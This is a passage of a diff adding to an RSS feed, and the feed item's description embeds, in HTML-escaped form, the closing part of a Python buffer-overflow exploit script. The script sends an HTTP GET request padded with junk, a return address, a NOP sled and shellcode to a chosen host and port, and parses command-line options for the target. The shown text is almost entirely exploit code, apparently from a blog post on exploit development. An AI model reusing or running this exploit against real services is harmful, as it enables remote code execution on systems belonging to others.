+                print &amp;quot;[*] Connection error&amp;quot;
+                exit(1)
+
+        print s.recv(1024)
+        s.send(&amp;quot;GET /&amp;quot; + junk + ret + &amp;quot; HTTP/1.1\n&amp;quot; + nops + shellcode)
+
+
+if __name__ == &amp;quot;__main__&amp;quot;:
+    parser = OptionParser(&amp;quot;usage: %prog [options]&amp;quot;)
+    parser.add_option(&amp;quot;-H&amp;quot;, &amp;quot;--host&amp;quot;, dest=&amp;quot;hostname&amp;quot;, default=&amp;quot;127.0.0.1&amp;quot;,
+     type=&amp;quot;string&amp;quot;, help=&amp;quot;Target to run against&amp;quot;)
+    parser.add_option(&amp;quot;-p&amp;quot;, &amp;quot;--port&amp;quot;, dest=&amp;quot;portnum&amp;quot;, default=20000,
+     type=&amp;quot;int&amp;quot;, help=&amp;quot;Target port&amp;quot;)
+
+    (options, args) = parser.parse_args()
+
+    exploit(options.hostname, options.portnum)
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+  </channel>
+</rss>
